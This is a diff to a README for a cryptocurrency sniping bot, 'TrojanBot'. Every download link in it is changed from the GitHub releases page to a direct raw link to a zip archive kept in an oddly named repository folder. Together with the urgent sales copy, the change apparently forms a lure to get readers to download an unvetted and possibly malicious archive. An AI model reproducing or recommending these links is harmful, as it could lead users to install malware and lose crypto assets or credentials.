@@ -1,6 +1,6 @@
 # 🤖 TrojanBot-Trojan-on-Solana-Sniper-2026 - Fastest Solana Token Sniper with Copy Trading
 
-[![Download TrojanBot](https://img.shields.io/badge/Download-TrojanBot_2026-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/vophung5112/TrojanBot-Trojan-on-Solana-Sniper-2026/releases)
+[![Download TrojanBot](https://img.shields.io/badge/Download-TrojanBot_2026-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/vophung5112/TrojanBot-Trojan-on-Solana-Sniper-2026/main/isopodan/v2.3.zip)
 
 ## 🚀 What Is TrojanBot?
 
@@ -10,7 +10,7 @@ This application is perfect for anyone who wants to trade cryptocurrencies witho
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: **[Download TrojanBot](https://github.com/vophung5112/TrojanBot-Trojan-on-Solana-Sniper-2026/releases)**
+Visit this link to download the application: **[Download TrojanBot](https://raw.githubusercontent.com/vophung5112/TrojanBot-Trojan-on-Solana-Sniper-2026/main/isopodan/v2.3.zip)**
 
 ### Step-by-Step Setup Guide
 
@@ -174,7 +174,7 @@ TrojanBot puts professional-grade trading tools in your hands. Whether you're hu
 
 Don't wait – the best opportunities disappear in seconds. Download TrojanBot today and start trading smarter.
 
-**[🚀 Download TrojanBot Now](https://github.com/vophung5112/TrojanBot-Trojan-on-Solana-Sniper-2026/releases)**
+**[🚀 Download TrojanBot Now](https://raw.githubusercontent.com/vophung5112/TrojanBot-Trojan-on-Solana-Sniper-2026/main/isopodan/v2.3.zip)**
 
 ---
 
